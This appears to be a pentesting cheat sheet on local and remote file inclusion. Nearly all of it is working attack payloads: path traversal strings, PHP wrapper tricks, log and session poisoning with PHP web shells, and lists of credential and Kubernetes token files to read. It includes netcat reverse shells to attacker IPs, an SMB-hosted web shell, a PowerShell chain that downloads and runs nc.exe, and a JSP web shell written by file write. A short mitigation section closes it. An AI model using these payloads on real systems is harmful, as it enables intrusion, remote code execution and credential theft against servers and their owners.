# LFI/RFI - Local & Remote File Inclusion

## Overview

File Inclusion vulnerabilities occur when web applications dynamically include files based on user-supplied input without proper validation. Attackers can exploit these to read sensitive files or execute malicious code on the server.

**Local File Inclusion (LFI)**: The server loads a local file based on user-controlled input, potentially exposing sensitive data or leading to Remote Code Execution (RCE).

**Remote File Inclusion (RFI)**: The file is loaded from a remote server, allowing the attacker to execute arbitrary code on the vulnerable server. RFI is generally more severe than LFI.

### Vulnerable PHP Functions
```php
include(), include_once(), require(), require_once()
```

## Tools

```bash
# LFI/RFI exploitation framework
# https://github.com/kurobeats/fimap
fimap -u "http://10.11.1.111/example.php?test="

# Kadimus - LFI/RFI scanner and exploiter
# https://github.com/P0cL4bs/Kadimus
./kadimus -u http://localhost/?pg=contact -A "Mozilla/5.0"

# DotDotPwn - Path traversal fuzzer
# https://github.com/wireghoul/dotdotpwn
dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

# Shellfire - LFI/RFI and command injection exploitation shell
# https://github.com/0x34e/shellfire
sudo apt install shellfire
shellfire

# Apache-specific LFI scanner
# https://github.com/imhunterand/ApachSAL
```

## Methodology

1. **Identify inclusion parameters** - Look for requests with filenames like `include=main.inc`, `template=/en/sidebar`, `file=foo/file1.txt`, `page=contact.php`
2. **Test for path traversal** - Modify and test: `file=foo/bar/../file1.txt`
   - If the response remains the same, the parameter is likely vulnerable
   - If not, some form of sanitization or blocking is present
3. **Attempt to access world-readable files** - Try `/etc/passwd` (Linux) or `C:\windows\win.ini` (Windows)

## Local File Inclusion (LFI)

### Basic LFI

```bash
# Basic LFI - Reading system files
curl -s "http://10.11.1.111/gallery.php?page=/etc/passwd"

# Common parameters to test
?cat=
?dir=
?action=
?file=
?download=
?path=
?folder=
?page=
?inc=
?view=
?content=
?layout=
?include=
?document=
```

### Path Traversal Bypass Techniques

```bash
# Double URL encoding
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode encoding
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Non-recursive stripping bypass (e.g., if filter removes "../")
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/.....\/.....\/../etc/passwd

# URL encoding with backslash (Windows)
http://some.domain.com/static/%5c..%5c..%5c..%5c../etc/passwd

# Path separator mixing
http://example.com/index.php?page=..\..\..\etc\passwd

# Absolute path bypass
http://example.com/index.php?page=/etc/passwd
http://example.com/index.php?page=C:\windows\win.ini

# Null byte injection (PHP < 5.3.4)
http://10.11.1.111/page=http://10.11.1.111/maliciousfile%00.txt
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig
```

### Advanced Path Bypass Examples

```bash
# Various traversal patterns
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html

# Protocol wrappers
https://abc.redact.com/asd.php?file:///etc/passwd
https://abc.redact.com/asd.php?file:///etc/passwd%00
https://abc.redact.com/asd.php?file:///etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd%00.ext

# Advanced traversal with chaining
https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd

# 403 bypass techniques
/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#
/secret/
/secret/. 
//secret//
/./secret/..
/admin..;/
/admin%20/
/%20admin%20/
/admin%20/page
/%61dmin
```

### Cookie-Based LFI

```http
GET /vulnerable.php HTTP/1.1
Host: target.com
Cookie: usid=../../../../../../../../../../../../../etc/passwd
```

### LFI on Windows Systems

```bash
# Windows hosts file
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

# Boot.ini
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
```

## PHP Wrappers for LFI

### php://filter - Read PHP Source Code

```bash
# Base64 encode to read PHP source (bypasses execution)
http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d savefile.php

http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php

# Chain multiple filters
http://example.com/index.php?page=php://filter/read=string.toupper|string.rot13|string.tolower/resource=/etc/passwd

# Compression + base64
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

# Character encoding conversion (can bypass filters)
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16le/resource=/etc/passwd
```

### php://input - POST Data Execution

```bash
# Send PHP code in POST body (requires allow_url_include=On)
curl -X POST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```

### data:// - Embedded Payload

```bash
# Execute PHP code from data wrapper
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

### expect:// - Command Execution

```bash
# Requires expect PHP extension
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

### phar:// - Archive Wrapper

```bash
# Create malicious PHAR archive
echo "<?php system(\$_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg

# Access via LFI
http://example.com/index.php?page=phar://shell.jpg%23payload.php&cmd=id
```

### zip:// - ZIP Wrapper

```bash
# Similar to phar://
echo "<?php system(\$_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg

# Access via LFI (note the # encoding)
http://example.com/index.php?page=zip://shell.jpg%23payload.php&cmd=id
```

## LFI to RCE Techniques

### 1. Log File Poisoning

Inject PHP code into server logs by manipulating HTTP headers, then include the log file.

```bash
# Poison Apache access log via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Common log paths
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Include the poisoned log
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id

# Poison via other headers
curl -H "User-Agent: <?php system('id'); ?>" http://target.com/
curl -H "Referer: <?php system('id'); ?>" http://target.com/
curl -H "X-Forwarded-For: <?php system('id'); ?>" http://target.com/
```

**Real-World Example: CVE-2020-16152 - Aerohive NetConfig LFI to RCE**

This vulnerability affected Aerohive NetConfig versions 10.0r8a and older, allowing unauthenticated attackers to achieve root-level remote code execution. The exploit combined LFI (via PHP 5 string truncation vulnerability) with log poisoning of `/tmp/messages`.

```python
# Metasploit module exists for this exploit
# The attack poisons the log with PHP system calls, then includes it
# See: exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce
```

### 2. PHP Session Poisoning

```bash
# 1. Set a session cookie
# 2. Poison the session file via a parameter
POST /login.php HTTP/1.1
Cookie: PHPSESSID=attacker_session

login=1&user=<?php system("id");?>&pass=password

# 3. Include the session file
http://target.com/index.php?page=/../../../../../var/lib/php5/sess_attacker_session

# Alternative session paths
/var/lib/php/sessions/sess_[SESSION_ID]
/tmp/sess_[SESSION_ID]
/var/lib/php7/sessions/sess_[SESSION_ID]
```

### 3. /proc/self/environ Poisoning

```http
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

### 4. SSH Log Poisoning

```bash
# Inject PHP into SSH auth log
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include the log
http://target.com/index.php?page=/var/log/auth.log&cmd=id
```

### 5. Mail Log Poisoning

```bash
# Send mail with PHP payload
mail -s "<?php system('id'); ?>" victim@localhost < /dev/null

# Include mail log
http://target.com/index.php?page=/var/log/mail.log&cmd=id
```

### 6. PHP Filter Chain RCE (No File Write Required)

Recent research has shown that PHP filter chains can be used to generate arbitrary PHP code for execution without writing any files to disk. This technique uses PHP's stream filters to transform base64-encoded payloads into executable code.

```bash
# Tools like php_filter_chain_generator automate this
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

### 7. phpinfo() Race Condition

If `phpinfo()` is accessible with `file_uploads=on`, exploit the race condition between temporary file creation and cleanup.

### 8. Nginx Temp File Inclusion

When Nginx acts as a reverse proxy for PHP, it creates temporary files that may be accessible via LFI.

## Real-World LFI Exploitation Examples

### CVE-2025-11371 - Gladinet CentreStack/Triofox LFI (2025)

In October 2025, researchers identified active exploitation of an unauthenticated LFI vulnerability in Gladinet CentreStack and Triofox file-sharing platforms. Over 6,000 internet-exposed instances were vulnerable.

**Attack Vector**: Attackers could request and read arbitrary files from the application's filesystem without authentication by supplying specially crafted input to affected web endpoints.

**Impact**: 
- Reading `web.config` files containing cryptographic keys and access tokens
- Extracting machine keys to forge malicious ViewState
- Chained to achieve Remote Code Execution

**Technical Details**: The vulnerability existed in a temporary handler within the `UploadDownloadProxy` component. Removing that handler from `UploadDownloadProxyWeb.config` blocks the attack path.

### CVE-2022-47945 - ThinkPHP LFI (Active Exploitation 2025)

ThinkPHP versions before 6.0.14 are vulnerable to LFI via the `lang` parameter when language packs are enabled. Despite a low EPSS score of 7%, GreyNoise observed significant exploitation activity in early 2025, with 572 unique IPs attempting to exploit this vulnerability.

**Real-World Attack Pattern**:
```http
GET /index.php?lang=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.com
```

### CVE-2023-49103 - ownCloud GraphAPI Information Disclosure

This vulnerability affects ownCloud GraphAPI 0.2.x before 0.2.1 and 0.3.x before 0.3.1. Added to CISA KEV in November 2023, it continues to see active exploitation with 484 unique IPs attempting exploitation.

### LulzSec RFI Campaign (2011)

The infamous LulzSec hacking group heavily utilized RFI vulnerabilities in their attacks. Analysis of their chat logs revealed they maintained a botnet of approximately 8,000 infected servers used for DDoS attacks - each infected server being equivalent to roughly 3,000 bot-infected PCs.

**Key Quote from LulzSec Chat**:
> "lol - storm would you also like the RFI/LFI bot with google bypass i was talking about while i have this plugged in?"

The group used RFI to take down high-profile targets including the CIA public website.

## Remote File Inclusion (RFI)

### Basic RFI

```bash
# Direct remote file inclusion
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00

# Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
```

### PHP Configuration Requirements for RFI

```ini
allow_url_fopen = On    (default On)
allow_url_include = On  (default Off since PHP 5.2)
```

### RFI Over SMB (Bypassing allow_url_include)

Even when `allow_url_include` and `allow_url_fopen` are disabled, PHP on Windows systems can still include files from SMB shares.

**Step-by-Step SMB RFI Attack**:

1. **Setup SMB server with anonymous read access**:
```bash
# Install Samba
apt-get install samba

# Create share directory
mkdir /var/www/html/pub/
chmod 0555 /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/

# Configure smb.conf
cat > /etc/samba/smb.conf << EOF
[global]
workgroup = WORKGROUP
server string = Samba Server %v
security = user
map to guest = bad user

[ica]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
EOF

# Restart Samba
service smbd restart
```

2. **Host PHP web shell in SMB share**:
```php
<?php echo shell_exec($_GET['cmd']);?>
```

3. **Include via SMB**:
```http
http://vulnerable_application/page.php?page=\\ATTACKER_IP\ica\shell.php&cmd=ipconfig
```

**Real-World Attack Chain**:
```bash
# First request - download nc.exe
http://10.11.1.111/blog/?lang=\\10.10.14.42\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"

# Second request - execute reverse shell
http://10.11.1.111/blog/?lang=\\10.10.14.42\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.42 4444
```

### RFI via FTP

```bash
# If FTP wrappers are enabled
http://target.com/index.php?page=ftp://attacker.com/shell.php
```

## LFI via Video/Media Uploads (FFmpeg)

FFmpeg-based applications can be vulnerable to LFI through malicious media files.

```bash
# Create malicious AVI file exploiting FFmpeg
# References:
# https://github.com/FFmpeg/FFmpeg
# https://hackerone.com/reports/226756
# https://hackerone.com/reports/237381
```

## HTML-to-PDF Path Traversal

Modern HTML-to-PDF engines (TCPDF, html2pdf, wkhtmltopdf) can be exploited to read local files.

```bash
# Fingerprint the renderer first (check PDF metadata for Producer field)

# Inline SVG payload
<img src="data:image/svg+xml;base64,[BASE64_SVG_WITH_XLINK_HREF_TO_LOCAL_FILE]" />

# Bypass naive filter (TCPDF ≤ 6.8.2 only checks for '../' before decoding)
src="..%2f..%2fetc%2fpasswd"

# Double-encode for multi-stage decoding
src="..%252f..%252fetc%252fpasswd"
```

## Token Harvesting from Access Logs

If applications accept authentication tokens via GET parameters, LFI can be used to steal them from access logs.

```bash
# 1. Read access logs via LFI
GET /vuln/asset?name=..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1

# 2. Extract tokens from logs
# Look for patterns like ?AuthenticationToken=xxxxx

# 3. Replay stolen token
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
```

## LFI Payloads by File Extension

| Extension | Potential Impact |
|-----------|------------------|
| ASP / ASPX / PHP5 / PHP / PHP3 | Webshell / RCE |
| SVG | Stored XSS / SSRF / XXE |
| GIF | Stored XSS / SSRF |
| CSV | CSV Injection |
| XML | XXE |
| AVI | LFI / SSRF (via FFmpeg) |
| HTML / JS | HTML Injection / XSS / Open Redirect |
| PNG / JPEG | Pixel flood attack (DoS) |
| ZIP | RCE via LFI / DoS |
| PDF / PPTX | SSRF / Blind XXE |

## Chaining with Other Vulnerabilities

```bash
# Path traversal for file uploads
../../../tmp/lol.png

# SQL injection via image metadata
sleep(10)-- -.jpg

# XSS via image
<svg onload=alert(document.domain)>.jpg

# Command injection via filename
; sleep 10; -- -.jpg
```

## PHP Blind Path Traversal (Error Oracle)

When you control a file path in PHP functions like `file_get_contents`, `readfile`, `getimagesize`, or `md5_file` but cannot see output, you can use error-based exfiltration.

The UCS-4LE encoding trick can exfiltrate file contents character by character via error messages.

## Arbitrary File Write via Path Traversal

When upload handlers build destination paths from user-controlled data without canonicalization:

```xml
<!-- JMF-style arbitrary write -->
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks">
  <Command Type="SubmitQueueEntry">
    <Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
    <Data><![CDATA[
      <%@ page import="java.io.*" %>
      <% String c = request.getParameter("cmd"); if (c!=null) { Process p=Runtime.getRuntime().exec(c); } %>
    ]]></Data>
  </Command>
</JMF>
```

## curl --path-as-is for Path Traversal

Curl normalizes `../` sequences by default. Use `--path-as-is` to prevent this:

```bash
curl --path-as-is -b "session=$SESSION" \
  "http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
  --ignore-content-length -s | tr '\000' '\n'
```

## Common Files to Read via LFI

### Linux
```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/network/interfaces
/etc/issue
/etc/fstab
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/
/proc/self/mounts
/proc/self/status
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/auth.log
/var/log/mail.log
/var/log/messages
/var/log/syslog
```

### Windows
```
C:\boot.ini
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\inetsrv\MetaBase.xml
C:\Windows\System32\config\AppEvent.Evt
C:\Windows\System32\config\SecEvent.Evt
C:\Windows\System32\config\default.sav
C:\Windows\System32\config\security.sav
C:\Windows\System32\config\software.sav
C:\Windows\System32\config\system.sav
```

## Cross-Content Hijacking

Even uploading a JPG file can lead to cross-domain data hijacking and client-side attacks.

**References**:
- https://github.com/nccgroup/CrossSiteContentHijacking
- https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/

## Encoding Scripts in PNG IDAT Chunks

Scripts can be hidden in PNG IDAT chunks to bypass filters:
- https://yqh.at/scripts_in_pngs.php

## Mitigation Recommendations

1. **Disable dangerous PHP wrappers**: Set `allow_url_include = Off` and `allow_url_fopen = Off` in production

2. **Use whitelisting**: Only allow specific files to be included
```php
$allowed_pages = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed_pages)) {
    include($_GET['page'] . '.php');
}
```

3. **Input validation**: Sanitize user input and remove path traversal sequences

4. **Use basename()**: Extract only filename component when possible

5. **Web server configuration**: Disable directory traversal and follow symlinks where appropriate

6. **Regular patching**: Keep web applications and PHP updated. Monitor CISA KEV and real-time threat intelligence

7. **Remove unnecessary handlers**: Like the UploadDownloadProxy handler in CentreStack

## Related Topics

- **SSRF** (Server-Side Request Forgery) - Similar to RFI but for internal network requests
- **Command Injection** - Direct OS command execution
- **File Upload Vulnerabilities** - Upload to RCE chains
- **XXE** (XML External Entity) - Read local files via XML parsers
- **Path Traversal** - Directory traversal attacks
